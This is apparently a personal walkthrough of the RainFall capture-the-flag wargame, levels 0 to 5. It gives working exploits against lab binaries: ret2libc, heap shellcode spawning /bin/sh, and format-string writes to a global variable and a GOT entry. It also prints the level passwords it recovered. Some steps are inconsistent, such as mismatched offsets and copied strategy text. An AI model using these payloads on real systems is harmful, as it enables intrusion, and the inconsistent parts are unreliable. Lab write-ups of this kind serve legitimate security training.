
LEVEL_0:
./level0 423
$ cd ..
$ cd level1
$ cat .pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a

LEVEL_1
    - get the system addr:
        level1@RainFall:~$ gdb ./level1
        (gdb) disas system
        Dump of assembler code for function system@plt:
        0x08048360 <+0>:     jmp    *0x80497a0
        0x08048366 <+6>:     push   $0x10
        0x0804836b <+11>:    jmp    0x8048330
        End of assembler dump.
        
    - get the /bin/sh addr : 
        level1@RainFall:~$ gdb ./level1
        (gdb) b main
        Breakpoint 1 at 0x8048483
        (gdb) run
        Starting program: /home/user/level1/level1

        Breakpoint 1, 0x08048483 in main ()
        (gdb) info proc map
        process 4123
        Mapped address spaces:

                Start Addr   End Addr       Size     Offset objfile
                0x8048000  0x8049000     0x1000        0x0 /home/user/level1/level1
                0x8049000  0x804a000     0x1000        0x0 /home/user/level1/level1
                0xb7e2b000 0xb7e2c000     0x1000        0x0
                0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
                0xb7fd2000 0xb7fd5000     0x3000        0x0
                0xb7fdb000 0xb7fdd000     0x2000        0x0
                0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
                0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
                0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
                0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
                0xbffdf000 0xc0000000    0x21000        0x0 [stack]
        (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
        0xb7f8cc58
        1 pattern found.
        (gdb) x/s 0xb7f8cc58
        0xb7f8cc58:      "/bin/sh"
    

system()	        ->    0x08048360	\x60\x83\x04\x08
Fake Return Address	->    "AAAA"
"/bin/sh" string    ->    0xb7f8cc58	\x58\xcc\xf8\xb7

(python -c 'print("A"*76 + "\x60\x83\x04\x08" + "AAAA" + "\x58\xcc\xf8\xb7")' ; cat ) | ./level1

whoami
level2
cd ..
cd level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

scp level2@192.168.0.114:/home/user/level2/level2 ./level2

LEVEL_2:
   Exploit the overflow to get a shell. Since return-to-stack is blocked, we execute shellcode from the heap using strdup().
Exploit Strategy
1.Inject shellcode into local_50 buffer.

2.strdup(local_50) copies this shellcode to heap at a predictable address (found via GDB).

3.Overflow RET to point to the heap address returned by strdup().

4.When p() returns → EIP = heap → shellcode executes → /bin/sh spawns.

Why This Works
NX disabled → heap is executable.

ASLR off → heap address is stable (e.g., 0x0804a008).

strdup() gives us a writable+executable space for shellcode.

Check only blocks stack addresses, not heap.

Find heap address after strdup() using GDB:
```
break *0x0804853d
run < <(python exploit.py)
info registers
```
Craft payload:

Shellcode: 25-byte Linux x86 execve("/bin/sh").

Padding to 76 bytes.

Overwrite EBP (4 bytes).

Overwrite RET with heap address.
```
from struct import pack
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)
heap_addr = 0x0804a008
payload  = shellcode
payload += "A" * (76 - len(shellcode))
payload += "B" * 4
payload += pack("<I", heap_addr)
print(payload)
```
```
(python exploit.py; cat) | ./level2
```
LEVEL_3:
# 📚 Exploiting `level3` – Format String Vulnerability to Overwrite Global Variable

## 🔍 Challenge Summary

The target is a vulnerable binary named `level3` from the RainFall wargame on Linux. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x40`
- Satisfy the condition `if (m == 0x40)` to execute `system("/bin/sh")`


## 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3


$ cat /proc/sys/kernel/randomize_va_space
0
```
```
void v(void) {
  char local_20c[520];
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);  // ⚠️ format string vulnerability
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
}
```
 ## Exploitation Strategy

    Leak stack contents to determine the correct format string offset

    Use %n to write 0x40 to the address of the global variable m

    Trigger the condition and gain a shell

##  Step 1: Find the Address of m

```
(gdb) p &m
$1 = (int *) 0x0804988c
```
## Step 2: Discover Format String Offset

```
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level3
done
```
Look for 41414141 in the output. appears at %4$x, that means the offset is 7.
## Step 3: Exploit Script (Python)
```
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x0804988c)  # Address of 'm'
target_val = 0x40  # Decimal 64

written = len(m_addr)
padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)

```
## Step 4: Execute the Exploit
```
python exploit.py 4 
(cat payload.txt; cat) | ./level3
Wait what?!
$ whoami
level4
```

LEVEL_4:
# 📚 Exploiting `level4` – Format String Vulnerability to Overwrite Global Variable

## 🔍 Challenge Summary

The target is a vulnerable binary named `level4` from the RainFall wargame on Linux. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x1025544`
- Satisfy the condition `if (m == 0x1025544)` to execute ` system("/bin/cat /home/user/level5/.pass")`


## 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4


void p(char *param_1)

{
  printf(param_1);
  return;
}



void n(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

```
 ## Exploitation Strategy

    Leak stack contents to determine the correct format string offset

    Use %n to write 0x40 to the address of the global variable m

    Trigger the condition and gain a shell

##  Step 1: Find the Address of m

```
(gdb) p &m
$1 = (int *) 0x08049810
```
## Step 2: Discover Format String Offset

```
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level4
done
```
Look for 41414141 in the output. appears at %11$x, that means the offset is 7.
## Step 3: Exploit Script (Python)
```
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x08049810)
target_val = 0x1025544
written = len(m_addr)

padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)


```
## Step 4: Execute the Exploit
```
python exploit.py 11 
(cat payload.txt; cat) | ./level4
                                                b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
LEVEL_5:
```
$ ./level5
test
test
$
```
```
void o(void)

{
  system("/bin/sh");
                    // WARNING: Subroutine does not return
  _exit(1);
}



void n(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    // WARNING: Subroutine does not return
  exit(1);
}



void main(void)

{
  n();
  return;
}

```
## What happens?

    The program reads input via fgets() into a large buffer (local_20c).

    Then it calls printf(local_20c); — format string vulnerability!

    Finally, it calls exit(1);
## Goal

Use the format string vulnerability in printf(local_20c) to overwrite a GOT entry so when exit(1) is called, it actually calls o() instead of the normal exit().
## Step 1: Identify the GOT entry for exit

Run:
```
$ readelf -r ./level5 | grep exit
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit

```
So, exit@GOT is at 0x08049838 
## Step 2: Find the address of o()
```
$ gdb ./level5
(gdb) info fucntions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...

```
so the address of o is 0x080484a4

## Step 3: Exploit with format string

Use the format string vulnerability to write the address of o() into exit@GOT.

When n() calls exit(1), the program actually jumps to o(), spawning a shell.

How to write the address?

    Split o() address into two halves (low 2 bytes and high 2 bytes).

    Write these halves to exit@GOT and exit@GOT + 2 using %hn.

    Use format string to print enough characters for padding.
exploit script using python
```
import struct

ret_addr = 0x08049838
win_addr = 0x080484a4

low = win_addr & 0xffff       # 0x84a4
high = (win_addr >> 16)       # 0x0804

addr1 = struct.pack("<I", ret_addr)
addr2 = struct.pack("<I", ret_addr + 2)
print(addr1, addr2)
offset = 4
written = len(addr1) + len(addr2)  # 2 addresses = 8 bytes

pad1 = low - written
pad2 = high - low
if pad1 < 0:
    pad1 += 0x10000
if pad2 < 0:
    pad2 += 0x10000


fmt = "%%%dx%%%d$hn%%%dx%%%d$hn" % (pad1, offset, pad2, offset + 1)

payload = addr1 + addr2 + fmt.encode()

with open("payload.txt", "wb") as f:
    f.write(payload)
print("Payload written with offset %d" % offset)
```
```
(cat payload.txt; cat) | ./binary

whoami
level6
```


